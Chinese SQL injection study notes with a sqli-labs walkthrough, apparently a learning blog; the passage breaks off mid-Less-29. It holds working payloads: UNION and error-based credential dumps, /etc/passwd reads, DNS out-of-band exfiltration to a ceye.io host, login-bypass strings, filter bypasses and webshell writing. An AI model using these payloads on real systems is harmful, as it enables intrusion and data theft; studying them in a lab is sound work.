[{"content":"SQL注入相关(配合sqli-labs) 基础总结+sqli-lab，lab过程偏向白盒，省略黑盒探测过程\n数据库相关 分类  关系型数据库  表格存储，表和表间关系构成数据库，例如MySQL、SQLServer。\n 非关系型数据库  有Key-Value存储数据库、列存储数据库、文档型数据库、图形存储数据库。\n例如：\n键值数据库：Redis、Memcached\n文档数据库：MongoDB\n图形数据库：Neo4j\n基础操作 # 查看数据库\rshow databases;\r# 使用数据库\ruse mysql;\r# 查看当前数据库\rselect database();\r# 查看数据表\rshow tables;\r# 查看数据库版本\rselect version();\r# 查看当前数据库用户\rselect user();\r# 查看数据库路径\rselect @@datadir;\r# 查看安装路径\rselect @@basedir;\r# 查看系统类型\rselect @@version_compile_os;\rMySQL元数据-information_schema 该数据库存储MySQL 服务器所维护的所有其他数据库的信息，如数据库名，数据库的表，表的数据类型与访问权限等。\n该库中有以下三个表：\n SCHEMATA  提供当前 MySQL 实例中所有数据库的信息。show databases; 的结果就是取之此表。\n TABLES  提供数据库中所有表的信息(包括视图)。\n COLUMNS  提供表中所有列信息。\n查询数据表：\nselect table_name from information_schema.tables where table_schema='test';\r查询数据列：\nselect column_name from information_schema.columns where table_name='table1';\rSQL注入相关判断 种类 布尔型注入\n联合查询注入\n报错型注入\n时间型注入\n堆叠注入\n判断注入类型 在进行手工注入前需要判断当前位置是字符型还是数字型。\n 数字型  一般可通过and 1=1和and 1=2判断。\n使用运算符判断：\n通过加、减、乘、除等运算，判断输入参数附近有没有引号包裹。\n 字符型  一般可通过and '1'='1和and '1'='2判断。\n使用类型转换特性判断：\n在MySQL中当数字与字符进行比较时，字符会被转为数字进行比较。\n例如：\n\rimage\r\n字符串1和数字1相等；字符串1a和数字1相等；字符串b和数字0相等。\n 综上  可根据上述方法做一个基本的判断，例如?id=2-1，返回为空，表明不是数字型可能是字符型；访问?id=1a，成功回显，表明是字符型。\n判断数据库 基于报错判断  MySQL   you have an error in your SQL syntax,check the manual that corrsponds to your mysql server version for the tifht syntax to use near\u0026hellip;\n  Access   Microsoft JET Database…\n  MSSQL   Microsoft ODBC Database…\n 基于数据库标志  MSSQL  select @@version;\r Oracle  select banner from v$version;\r MySQL  select @@version,version(),length(user)\u0026gt;0;\r PostgreSQL  select version();\r基于数据库名  MySQL:information_schema Access:mysysobjects Oracle:sys.user_tables MSSQL:sysobjects  基于数据库特有函数   MSSQL:@@pack_received、@@rowcount\n  MySQL:connection_id()、last_insert_id()、row_count()\n  Oracle:bitand(1,1)\n  PostgreSQL: select extract(doy from now())\n  MSSQL和MySQL中都可用substring，而Oracle中只能调用substr\n  \u0026hellip;\n基于字符串处理方式 MSSQL：'a'+'b'='ab'\nMySQL：'a'+'b'='ab'、'ab'=concat('a','b')\nOracle：'a'+'b'='a'||'b'、'ab'=concat('a','b')\nPostgreSQL：'ab'=concat('a','b')\n\u0026hellip;\n基于特殊符号及注释  Access:null、%00 MySQL:#、--、/**/ Oracle:-- 、/**/ MSSQL：-- 、/**/ Oracle中不支持多行查询，当存在;子句查询符会报错  UNION注入 原理 union用于将两个或多个select查询语句结果集合并\n注意点：\n 使用union，select语句必须是相同数量的列\n 常见用法 -1\u0026#39;+UNION+SELECT+1,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users),3--+ // 库名 union select 1,group_concat(schema_name),3 from information_schema.schemata union select 1,(select schema_name from information_schema.schemata limit 0,1),3 // 表名 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=\u0026#39;security\u0026#39; // 列名 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=\u0026#39;security\u0026#39; and table_name=\u0026#39;emails\u0026#39; // 数据 union select 1,group_concat(id,email_id),3 from security.emails // ???待。。。 ?id=-1\u0026#39;unionselect1,(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(@x)FROM(users)WHERE(@x)IN(@x:=CONCAT(0x20,@x,username,password,0x3c62723e))))x),3**GROUP_CONCAT **\nGROUP_CONCAT(expr) ——从 expr 中连接所有非 NULL 的字符串。如果没有非 NULL 的字符串，那么它就会返回 NULL\n系统变量group_concat_max_len控制允许返回的最大字节长度，默认值为1M(\u0026gt;= MariaDB 10.2.4)或1K(\u0026lt;= MariaDB 10.2.3)\nGROUP_CONCAT([DISTINCT]expr[,expr...][ORDERBY{unsigned_integer|col_name|expr}[ASC|DESC][,col_name...]][SEPARATORstr_val])SEPARATOR指定串联各值时使用的分隔符。默认分隔符为逗号(,)CONCAT\n将多个字符串连接为一个字符串，如果当中有一个NULL，返回结果即为NULL\n显错注入 主要分类  BigInt 等数据类型溢出 Xpath 语法错误 count() + rand() + group by 导致主键重复 空间数据类型函数错误  updatexml 和 extractvalue MySQL版本\u0026gt;5.1添加了对XML文档修改和查询的函数updatexml 和 extractvalue，二者报错原理类似\n updatexml() (返回替换的XML片段) 和 extractvalue()(使用XPath表示法从XML字符串中提取值)第二个参数需要传入的是 Xpath 格式的字符串。输入不符合，将参数值返回并报错。\n报错长度最大为 32 位\n 常见用法\n//显示当前数据库updatexml(1,CONCAT(0x7e,database()),1)//显示所有数据库updatexml(1,CONCAT(0x7e,(selectschema_nameFROMINFORMATION_SCHEMA.SCHEMATAlimitx,1),0x7e),1)//获取表名updatexml(1,CONCAT(0x7e,(selecttable_namefrominformation_schema.tableswheretable_schema=\u0026#34;sectest\u0026#34;limitx,1),0x7e),1)updatexml(1,make_set(3,\u0026#39;~\u0026#39;,(selectgroup_concat(table_name)frominformation_schema.tableswheretable_schema=database())),1)//获取列名updatexml(1,CONCAT(0x7e,(selectcolumn_namefrominformation_schema.COLUMNSwheretable_name=\u0026#34;wp_user_\u0026#34;limit1,1),0x7e),1)updatexml(1,make_set(3,\u0026#39;~\u0026#39;,(selectgroup_concat(column_name)frominformation_schema.columnswheretable_name=\u0026#34;users\u0026#34;)),1)//获取数据updatexml(1,CONCAT(0x7e,(selectusernamefromwp_user_limit0,1),0x7e),1)updatexml(1,CONCAT(0x7e,(selectpasswordfromwp_user_whereusername=\u0026#34;admin\u0026#34;limit0,1),0x7e),1)updatexml(1,CONCAT(0x7e,(selectGROUP_CONCAT(username,0x3a,password)fromwp_user_whereid=1),0x7e),1)updatexml(1,make_set(3,\u0026#39;~\u0026#39;,(selectdatafromusers)),1)#三要素显错注入 三要素原理分析\n floor(x) 返回\u0026lt;=x的最大整数 rand(0) 在给了随机种子0之后，将产生固定伪随机序列 floor(rand(0)*2) 最终产生的可预测伪随机序列是'011011\u0026hellip;' 使用count(*) 和 group by统计数据，就是建立虚拟表，对每条记录计算统计键，无则插入，有则+1 当以foor(rand(0*2))为键使用group by 分组统计时：针对查询表第一条记录，插入前第1次计算值为0，查无此键，进行插入时第2次计算值为1，查无此键，插入即可，实际插入虚拟表的第一条记录键为1；针对查询表第二条记录，插入前第3次计算值为1，查有此键，则直接将count+1，不再进行插入时的计算；针对第三条记录，插入前第4次计算值为0，查无此键，进行插入时第5次计算值为1，查有此键，虚拟表主键唯一，无法插入报错！！！  核心其实就是固定的伪随机序列和多次计算\n三要素(count、rand、group by)再加一个要素就是原始查询表记录至少为3条\n注意点\n 在查询结果上再执行查询时，必须给定一个别名\nlimit 0,1 -\u0026gt; offset + 偏移量 表示最后返回的记录条数\nhttps://blog.csdn.net/weixin_43803070/article/details/96448914\n 常见用法\n1\u0026#39; and (select 1 from (select count(*), concat(user(), floor(rand(0)*2))x from information_schema.tables group by x)a) 1\u0026#39;and(select1from(selectcount(*),concat((selectconcat(username,\u0026#39;,\u0026#39;,password)fromuserslimit0,1),floor(rand(0)*2))xfrominformation_schema.tablesgroupbyx)a)--+ 注意点：上述两个payload注出来的数据后跟着一个数字`1`，因为concat了一个`floor(rand(0)*2)`其他特性利用 列名重复 原理\nNAME_CONST可以制造一个列，利用列名重复报错\n注意点\n 常根据官方文档，name_const函数要求参数必须是常量，所以实际使用上还没有比较好的利用方式。但利用这个特性加上join函数可以爆列名\n 常见用法\nselect*from(selectNAME_CONST(version(),1),NAME_CONST(version(),1))x;ERROR1060(42S21):Duplicatecolumnname\u0026#39;5.7.17\u0026#39;//配合join获取列名select*from(select*fromtestajointestb)c;ERROR1060(42S21):Duplicatecolumnname\u0026#39;id\u0026#39;select*from(select*fromtestajointestbusing(id))c;//using(id)等同于配合join使用的onERROR1060(42S21):Duplicatecolumnname\u0026#39;name\u0026#39;//两个test表必然每个列都重复，using了id列之后，就会继续报出第二列错select*from(select*fromtestajointestbusing(id，name))c;//报第三列列名几何函数 原理\nmysql有些几何函数，例如geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()，这些函数对参数要求是形如(1 2,3 3,2 2 1)这样几何数据，如果不满足要求，则会报错\n？？？？报错原理有待考究\n注意点\n 在版本号为5.5.47上可以用来注入，而在5.7.17上则不行\n 常见用法\n5.5.47//可行1\u0026#39; and (select multipoint((select * from (select * from (select version())a)b))) ERROR 1367 (22007): Illegal non geometric \u0026#39;(select`b`.`version()`from((select\u0026#39;5.5.47\u0026#39;AS`version()`fromdual)`b`))\u0026#39; value found during parsing 5.7.17 //失效 1\u0026#39;and(selectmultipoint((select*from(select*from(selectversion())a)b)))ERROR1367(22007):Illegalnongeometric\u0026#39;(select `a`.`version()` from ((select version() AS `version()`) `a`))\u0026#39;valuefoundduringparsingexp()等函数 原理\nMySQL 能记录的 Double 数值范围有限，一旦结果超过范围，则该函数报错。这个范围的极限是 709，当传递一个大于 709 的值时，函数 exp() 就会引起一个溢出错误；\n当用 ~ 运算符按位取反的方式得到一个最大值，该运算符可以处理一个字符串，经过其处理的字符串会变成一个很大整数其足以超过 MySQL 的 Double 数组范围，从而报错输出\n注意点\n 使用版本：MySQL5.5.5 及以上版本\n 常见用法\n1\u0026#39; and (select exp(~(select * from(select version())x))) ERROR 1690 (22003): DOUBLE value is out of range in \u0026#39;exp(~((select\u0026#39;5.5.29\u0026#39;fromdual)))\u0026#39; 1\u0026#39;and(selectexp(~(select*from(selectuser())x)))ERROR1690(22003):DOUBLEvalueisoutofrangein\u0026#39;exp(~((select \u0026#39;root@localhost\u0026#39; from dual)))\u0026#39;1\u0026#39; and (select exp(~(select * from(select database())x))) ERROR 1690 (22003): DOUBLE value is out of range in \u0026#39;exp(~((select\u0026#39;ctf\u0026#39;fromdual)))\u0026#39; //读取文件(13行限制) 1\u0026#39;and(selectexp(~(select*from(selectload_file(\u0026#39;/etc/passwd\u0026#39;))x)))//dump当前上下文中所有的tables和columns注意：因为是当前上下文，所以单引号前条件得存在，正确1\u0026#39; and (select exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x))) CTF demo\nhttps://whoamianony.top/2021/05/01/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%20MySQL%20exp()%20%E5%87%BD%E6%95%B0%E8%BF%9B%E8%A1%8C%20Sql%20%E6%B3%A8%E5%85%A5/\n注意点\n 需要嵌套才能报错回显的原因(个人理解)：\nmysql报错回显(几何函数、exp()等函数)一般报错返回的是列名相关，不嵌套就正常返回列名，比如\nselect version()； //其返回结果集的列名即为version()\r而在报错回显机制种，一旦嵌套就会详细返回列名中包含的执行语句(MySQL本身报错机制？？？)，比如\nselectexp(~(select*from(selectversion())x));ERROR1690(22003):DOUBLEvalueisoutofrangein\u0026#39;exp(~((select \u0026#39;5.5.29\u0026#39; from dual)))\u0026#39;//\u0026#34;select \u0026#39;5.5.29\u0026#39; from dual\u0026#34;即为列名 bool盲注 \u0026amp; 时间型盲注 盲注用在不知道数据库返回值的情况下对数据内容进行猜测\n 盲注适用场景：无法直接回显获取执行结果，只能根据返回状态判断\nbool型：返回 True 和 False 两种状态页面，根据页面返回不同，猜解数据\n时间型：通过注入能够造成延时的特定语句，根据页面的物理反馈，来判断是否注入成功，如：在 SQL 语句中使用 sleep() 函数看加载网页的时间来判断注入点\n 常用函数 编码转换函数 ord()、ascii() ：将字符转为ascii码\nchar()：将ascii码转为字符\n条件判断函数 if(exp1, exp2, exp3)\nselect case when username=\u0026ldquo;admin\u0026rdquo; then sleep(1) else \u0026ldquo;error\u0026rdquo; end from user\n截取函数 substr()\nubstr(str, pos, len) //从 pos 位置开始，截取字符串 str 的 len 长度\rsubstr(str from pos for length) //可以用在过滤了，的情况\rsubstring()\nsubstring(str, pos, len) //从 pos 位置开始，截取字符串 str 的 len 长度\rsubstring(str from pos for length) mid()\nmid(str, pos, length)\rmid(str from pos for length)\r注意点\n 以上含pos参数的函数中，pos从1开始\n left() \u0026amp; right()\nleft(str, len) right(str, len)\r正则表达式\nselect * from user where password rlike \u0026quot;^1\u0026quot;\rselect * from user where password REGEXP \u0026quot;^1\u0026quot;\rselect * from user where password REGEXP \u0026quot;^12\u0026quot;\r延时函数 sleep(n) //挂起n秒\rbenchmark(count, sha(1)) //实行sha(1)函数count次数，从而延时\rSELECT count(*) from information_schema.columns A, information_schema.columns B, information_schema.tables C; //笛卡尔积造成延时\rselect * from users where id =1 and IF(1,concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',0) //用正则表达式匹配长字符制造延时\rrpad(string, length, rpad_string) //rpad()函数将一个字符串string用另一个字符串rpad_string在右侧填充到一定长度length\r其他函数 count()\rlength()\rsqlmap检测各类注入 //union注入\rsqlmap -u \u0026quot;http://127.0.0.1:8888/Less-1/?id=1\u0026quot; --dbms=MySQL --random-agent --flush-session --technique=U -v 3\r//显错注入\r--technique=E\r//bool盲注\r--technique=B\r//时间型盲注\r--technique=T\rOOB注入    类别 注入类型 说明     带内 报错、union 直接回显数据   间接推断 bool、时间盲注 非直接回显，根据状态间接判断   带外 OOB 通过其他信道获取数据    Out Of Band 带外通道技术(OOB)让攻击者能够利用其他信道获取非直接回显的漏洞。\n带外通道技术通常需要让目标来生成TCP/UDP/ICMP 请求并带有敏感数据，攻击者可以通过这接收和处理这个请求来提取想要的数据。\n前提：\n 防火墙允许出站  示意图：\n\rimage\r\nOOB注入利用原理 Windows中的UNC路径 比如Windows中访问共享文件时就会用到如下网络地址，这就是UNC路径：\n\\\\192.168.33.33\\haha\\\r要想带出数据还是要靠DNSLog。\nload_file函数是用来读取文件内容，读取成功会返回文件内容的字符串，失败返回null。\n利用方法：\nselect load_file(concat('\\\\\\\\',(select hex(concat_ws('~',username,password)) from users limit 0,1),'.xxx.ceye.io\\\\aa'))\r# 通过concat函数将查询结果与域名拼接形成UNC路径，调用load_file函数对UNC路径发起请求，因此成功发起DNS请求将数据外带\rload_file函数使用注意 该函数使用受 secure_file_priv 的限制，如果secure_file_priv 值为null或其他特定目录，则无法构造任意UNC路径进行利用\n大文本传输技巧 域名长度限制：\n 域名由标签组成，以 . 分割，标签的长度不可以超过 63 个字符 整个域名不可以超过 253 个字符，包括 .  绕过限制思路：\n load_file读取内容 substr对文本内容切片 to_base64对切片后的内容编码  selectconcat(to_base64(substr(load_file(\u0026#34;xxx\u0026#34;),1,10)),\u0026#34;.xxx.ceye.io\\\\a\u0026#34;)asresultOracle数据库利用OOB的技巧 Oracle 数据库中存在发起 HTTP 请求的函数 UTL_HTTP.request，它的返回类型是长度为 2000 或更短的字符串。\nUTL_HTTP.request(url, proxy)\r通过注入执行下列SQL语句：\nselect UTL_HTTP.request('http://ip/xxx.php'||'?id='||(select version from v$instance)) from dual;\r在xxx.php中接收id参数。\nSQL注入——命令执行  dumpfile函数写shell udf执行命令 sqlmap \u0026ndash;os-shell(本质还是webshell)  sqli-lab Less-1    拼接点 可用注入类型     SELECT * FROM users WHERE id='$id' LIMIT 0,1 UNION、显错、bool盲、延时盲    Less-2    拼接点 可用注入类型     SELECT * FROM users WHERE id=$id LIMIT 0,1 UNION、显错、bool盲、延时盲    与Less-1利用方式一致，闭合时候不同\nLess-3    拼接点 可用注入类型     SELECT * FROM users WHERE id=('$id') LIMIT 0,1 UNION、显错、bool盲、延时盲    与Less-1利用方式一致，闭合时候不同\nLess-4 $id = '\u0026quot;' . $id . '\u0026quot;';\r$sql=\u0026quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1\u0026quot;;\r   拼接点 可用注入类型     双引号+单括号 UNION、显错、bool盲、延时盲    Less-5 $sql=\u0026quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1\u0026quot;;\rif true:\r打印 'You are in ...';\relse:\rprint_r(mysql_error());\r   拼接点 可用注入类型     单引号 显错、bool盲、延时盲    缺少回显机制，但可以依靠盲注和显错\nLess-6    拼接点 可用注入类型     双引号 显错、bool盲、延时盲    缺少回显机制，可以依靠盲注和显错\nLess-7 $sql=\u0026quot;SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1\u0026quot;;\rif true:\r打印 'You are in.... Use outfile......';\relse:\r//print_r(mysql_error());\r   拼接点 可用注入类型     单引号+双括号 显错、bool盲、延时盲    缺少回显机制和报错机制，只能依靠盲注\ninto outfile 写敏感信息 前提是要知道网站根目录路径，确保写入后可以访问到\n\rimage\r\n 一开始是写不进去，因为网站用户对根目录下没有写权限，尝试更改权限后成功写入\n 写shell \rimage\r\nLess-8    拼接点 可用注入类型     单引号 bool盲、延时盲    同Less-7\nLess-9 $sql=\u0026quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1\u0026quot;;\rif true:\r打印 'You are in....';\relse:\r打印 'You are in....';\r   拼接点 可用注入类型     单引号 延时盲    无论true或false，全都打印同一字符串，无法bool盲注，只能延时盲注\nLess-10    拼接点 可用注入类型     双引号 延时盲    同Less-9\nLess-11 $uname=$_POST['uname'];\r$passwd=$_POST['passwd'];\r@$sql=\u0026quot;SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1\u0026quot;;\rif true:\r打印结果\relse:\rprint_r(mysql_error());\r   拼接点 可用注入类型     POST-单引号 UNION、显错、bool盲、延时盲    万能密码 uname=admin'--+\u0026amp;passwd=\runame=admin'#\u0026amp;passwd=\runame=admin\u0026amp;passwd=1' or 1--+\u0026amp;submit=Submit\runame=admin\u0026amp;passwd=1'||1--+\u0026amp;submit=Submit\runame=admin\u0026amp;passwd=1' or 1#\u0026amp;submit=Submit\runame=admin\u0026amp;passwd=1'||1#\u0026amp;submit=Submit\runame=admin\u0026amp;passwd=1'or'1'='1\u0026amp;submit=Submit\runame=admin\u0026amp;passwd=1'||'1'='1\u0026amp;submit=Submit\r注意 POST注入最好走bp\nLess-12    拼接点 可用注入类型     POST-双引号+单括号 UNION、显错、bool盲、延时盲    与Less-11一致\nLess-13    拼接点 可用注入类型     POST-单引号+单括号 显错、bool盲、延时盲    不回显查询结果，除了union其他都可\nLess-14    拼接点 可用注入类型     POST-双引号 显错、bool盲、延时盲    不回显查询结果，除了union其他都可\nLess-15    拼接点 可用注入类型     POST-单引号 bool盲、延时盲    不回显查询结果，不报错\nLess-16    拼接点 可用注入类型     POST-双引号+单括号 bool盲、延时盲    不回显查询结果，不报错\nLess-17 $uname=check_input($_POST[\u0026#39;uname\u0026#39;]); $passwd=$_POST[\u0026#39;passwd\u0026#39;]; @$sql=\u0026#34;SELECT username, password FROM users WHERE username= $unameLIMIT 0,1\u0026#34;; if select 语句有结果： $update=\u0026#34;UPDATE users SET password = \u0026#39;$passwd\u0026#39; WHERE username=\u0026#39;$uname\u0026#39;\u0026#34;; if mysql报错： print_r(mysql_error());    拼接点 可用注入类型     POST-单括号 显错、bool盲、延时盲    uname参数被过滤，只能考虑给一个正确的uname值进入分支，对update语句进行注入\n无数据回显\nLess-18 $uagent = $_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;]; $IP = $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]; $uname = check_input($_POST[\u0026#39;uname\u0026#39;]); $passwd = check_input($_POST[\u0026#39;passwd\u0026#39;]); $sql=\u0026#34;SELECT users.username, users.password FROM users WHERE users.username=$unameand users.password=$passwdORDER BY users.id DESC LIMIT 0,1\u0026#34;; if select 语句有结果： $insert=\u0026#34;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (\u0026#39;$uagent\u0026#39;, \u0026#39;$IP\u0026#39;, $uname)\u0026#34;; 输出 $uagent; print_r(mysql_error()); else: print_r(mysql_error());    拼接点 可用注入类型     POST-单括号 显错、bool盲、延时盲    该注入类型为insert注入，首先需要给一个正确的用户名、密码进入分析，对insert语句进行注入\ninsert注入必须要闭合后面语句\n如下：\n' and updatexml(1,concat(0x7e,(select user()),0x7e),1) and '1'='1\r' and updatexml(1,concat(0x7e,(select user()),0x7e),1),\u0026quot;1\u0026quot;,\u0026quot;1\u0026quot;)--+\rLess-19    拼接点 可用注入类型     POST-单括号 显错、bool盲、延时盲    类似18，注入点在referer头\nLess-20 if cookie中没有uname参数：\r输出登录信息;\rif 提交uname和passwd：\r$uname = check_input($_POST['uname']);\r$passwd = check_input($_POST['passwd']);\r$sql=\u0026quot;SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1\u0026quot;;\r$cookee = $row1['username'];\rif 有返回结果:\rsetcookie('uname', $cookee, time()+3600);\relse:\rprint_r(mysql_error());\relse:\rif 没有提交submit参数：\r$cookee = $_COOKIE['uname'];\r$sql=\u0026quot;SELECT * FROM users WHERE username='$cookee' LIMIT 0,1\u0026quot;;\rif 没有返回结果:\r输出 mysql_error();\rif 有返回结果:\r回显查询结果;\relse:\rsetcookie('uname', $row1['username'], time()-3600); //通过把失效日期设置为过去的日期/时间，删除一个 cookie\r   拼接点 可用注入类型     POST-单括号 UNION、显错、bool盲、延时盲    cookie中uname参数没有过滤，有数据回显、有报错\nsqlmap 带cookie注入用法 //UINION 其中 “-p 参数” 表示要测试的参数，这时--level失效；也可以使用'*'去标记参数\rsqlmap -u \u0026quot;http://127.0.0.1:8888/Less-20/\u0026quot; --cookie=\u0026quot;uname=admin\u0026quot; -p \u0026quot;cookie\u0026quot; --dbms=MySQL --random-agent --flush-session --technique=U -v 3\rLess-21 代码逻辑和Less-20类似，只不过获取set cookie时用了base64编码，获取cookie值时再解码拼入sql语句\n   拼接点 可用注入类型     POST-单括号+单括号 UNION、显错、bool盲、延时盲    Less-22 类似Less-21\n   拼接点 可用注入类型     POST-双引号 UNION、显错、bool盲、延时盲    Less-23 $id=$_GET[\u0026#39;id\u0026#39;]; //过滤了注释符 $reg = \u0026#34;/#/\u0026#34;; $reg1 = \u0026#34;/--/\u0026#34;; $replace = \u0026#34;\u0026#34;; $id = preg_replace($reg, $replace, $id); $id = preg_replace($reg1, $replace, $id);    拼接点 可用注入类型     单引号 UNION、显错、bool盲、延时盲    过滤注释后，就需要闭合原始sql语句\n注意\n UNION 注入使用from，在闭合原始语句时候需要引入where保证sql语句语法正确，例如：\n-1' union select 1,group_concat(username,':',password),3 from security.users where 1 and \u0026lsquo;1\u0026rsquo; = \u0026lsquo;1\n Less-24(二次注入) login_create.php\n$username= mysql_escape_string($_POST['username']) ;\r$pass= mysql_escape_string($_POST['password']);\r$re_pass= mysql_escape_string($_POST['re_password']);\r$sql = \u0026quot;select count(*) from users where username='$username'\u0026quot;;\rif 查询结果不为0：\r表明有用户存在，不可注册；\relse:\rif 两次输入密码一致：\r$sql = \u0026quot;insert into users ( username, password) values(\\\u0026quot;$username\\\u0026quot;, \\\u0026quot;$pass\\\u0026quot;)\u0026quot;;\r重定向到登录页面；\relse:\r提示输入不一致；\rlogin.php\n $username = mysql_real_escape_string($_POST[\u0026quot;login_user\u0026quot;]);\r$password = mysql_real_escape_string($_POST[\u0026quot;login_password\u0026quot;]);\r$sql = \u0026quot;SELECT * FROM users WHERE username='$username' and password='$password'\u0026quot;;\rif 查询有结果：\r$_SESSION[\u0026quot;username\u0026quot;] = 结果中的username值; //在session中设置username参数\r重定向到已登录界面；\rpass_change.php\nif 未登录：\r重定向到首页；\r$username= $_SESSION[\u0026quot;username\u0026quot;]; //从session中取出useranme值\r$curr_pass= mysql_real_escape_string($_POST['current_password']);\r$pass= mysql_real_escape_string($_POST['password']);\r$re_pass= mysql_real_escape_string($_POST['re_password']);\rif 两次密码输入一致：\r$sql = \u0026quot;UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' \u0026quot;;\rif 执行成功：\r输出成功更新密码；\relse:\r重定向到错误页面；\r分析 可看到基本上可进行直接注入的常规点都被转义过滤了，但是登录成功后，会从数据库中查询useranme值放入session；随后在pass_change页面更新密码语句存在注入点，且数据来源于从session取出来的值，也就是未过滤的值，因此存在二次注入\n利用 注册用户名为 admin’#\n登录之后随意填入当前密码，再填入修改后的密码，提交即可任意修改admin用户密码\nLess-25 $id= preg_replace(\u0026#39;/or/i\u0026#39;,\u0026#34;\u0026#34;, $id); $id= preg_replace(\u0026#39;/AND/i\u0026#39;,\u0026#34;\u0026#34;, $id); $sql=\u0026#34;SELECT * FROM users WHERE id=\u0026#39;$id\u0026#39; LIMIT 0,1\u0026#34;;    拼接点 可用注入类型     单引号 UNION、显错、bool盲、延时盲    绕过 双写\nor -\u0026gt; ||\nand -\u0026gt; \u0026amp;\u0026amp;(get型中要url编码，否则歧义)\nLess-25a    拼接点 可用注入类型     直接拼 UNION、bool盲、延时盲    与Less-25一致，拼接方式不同，不能报错\nLess-26 $id= preg_replace(\u0026#39;/or/i\u0026#39;,\u0026#34;\u0026#34;, $id);\t//strip out OR (non case sensitive) $id= preg_replace(\u0026#39;/and/i\u0026#39;,\u0026#34;\u0026#34;, $id);\t//Strip out AND (non case sensitive) $id= preg_replace(\u0026#39;/[\\/\\*]/\u0026#39;,\u0026#34;\u0026#34;, $id);\t//strip out /* $id= preg_replace(\u0026#39;/[--]/\u0026#39;,\u0026#34;\u0026#34;, $id);\t//Strip out -- $id= preg_replace(\u0026#39;/[#]/\u0026#39;,\u0026#34;\u0026#34;, $id);\t//Strip out # $id= preg_replace(\u0026#39;/[\\s]/\u0026#39;,\u0026#34;\u0026#34;, $id);\t//Strip out spaces $id= preg_replace(\u0026#39;/[\\/\\\\\\\\]/\u0026#39;,\u0026#34;\u0026#34;, $id); //Strip out slashes    拼接点 可用注入类型     单引号 UNION、显错、bool盲、延时盲    绕过 针对空白符，可用如下方式替换绕过，本次使用/\\s/匹配，所以用%0b和%a0才可绕过\n   符号 说明     %09 TAB 键(水平)   %0a 新建一行   %0c 新的一页   %0d return 功能   %0b TAB 键(垂直)   %a0 空格    Less-26a    拼接点 可用注入类型     单引号+单括号 UNION、bool盲、延时盲    与Less-26一致，拼接方式不同，不能报错\nLess-27 $id= preg_replace(\u0026#39;/[\\/\\*]/\u0026#39;,\u0026#34;\u0026#34;, $id);\t//strip out /* $id= preg_replace(\u0026#39;/[--]/\u0026#39;,\u0026#34;\u0026#34;, $id);\t//Strip out --. $id= preg_replace(\u0026#39;/[#]/\u0026#39;,\u0026#34;\u0026#34;, $id);\t//Strip out #. $id= preg_replace(\u0026#39;/[ +]/\u0026#39;,\u0026#34;\u0026#34;, $id);\t//Strip out spaces. $id= preg_replace(\u0026#39;/select/m\u0026#39;,\u0026#34;\u0026#34;, $id);\t//Strip out spaces. $id= preg_replace(\u0026#39;/[ +]/\u0026#39;,\u0026#34;\u0026#34;, $id);\t//Strip out spaces. $id= preg_replace(\u0026#39;/union/s\u0026#39;,\u0026#34;\u0026#34;, $id);\t//Strip out union $id= preg_replace(\u0026#39;/select/s\u0026#39;,\u0026#34;\u0026#34;, $id);\t//Strip out select $id= preg_replace(\u0026#39;/UNION/s\u0026#39;,\u0026#34;\u0026#34;, $id);\t//Strip out UNION $id= preg_replace(\u0026#39;/SELECT/s\u0026#39;,\u0026#34;\u0026#34;, $id);\t//Strip out SELECT $id= preg_replace(\u0026#39;/Union/s\u0026#39;,\u0026#34;\u0026#34;, $id);\t//Strip out Union $id= preg_replace(\u0026#39;/Select/s\u0026#39;,\u0026#34;\u0026#34;, $id);\t//Strip out select    拼接点 可用注入类型     单引号 UNION、显错、bool盲、延时盲    绕过 本次只是简单过滤了空格，而不是空白符，所以%0a即可绕过空格限制\nunioN\nunIon\nseLEct\n等等\nLess-27a    拼接点 可用注入类型     双引号 UNION、bool盲、延时盲    与Less-27一致，没有显错\nLess-28 $id= preg_replace(\u0026#39;/[\\/\\*]/\u0026#39;,\u0026#34;\u0026#34;, $id);\t//strip out /* $id= preg_replace(\u0026#39;/[--]/\u0026#39;,\u0026#34;\u0026#34;, $id);\t//Strip out --. $id= preg_replace(\u0026#39;/[#]/\u0026#39;,\u0026#34;\u0026#34;, $id);\t//Strip out #. $id= preg_replace(\u0026#39;/[ +]/\u0026#39;,\u0026#34;\u0026#34;, $id);\t//Strip out spaces. $id= preg_replace(\u0026#39;/[ +]/\u0026#39;,\u0026#34;\u0026#34;, $id);\t//Strip out spaces. $id= preg_replace(\u0026#39;/union\\s+select/i\u0026#39;,\u0026#34;\u0026#34;, $id);\t//Strip out UNION \u0026amp; SELECT.    拼接点 可用注入类型     单引号+单括号 UNION、bool盲、延时盲    过滤了union空白符select，可双写绕过，可替换空白符为%0b或%a0绕过\nLess-28a    拼接点 可用注入类型     单引号+单括号 UNION、bool盲、延时盲    少了几个过滤规则，其余和Less-28一致\nLess-29 index.php // 可以不用管，作者误放了应该\n普通可注入页面\rlogin.php\n$qs = $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]; 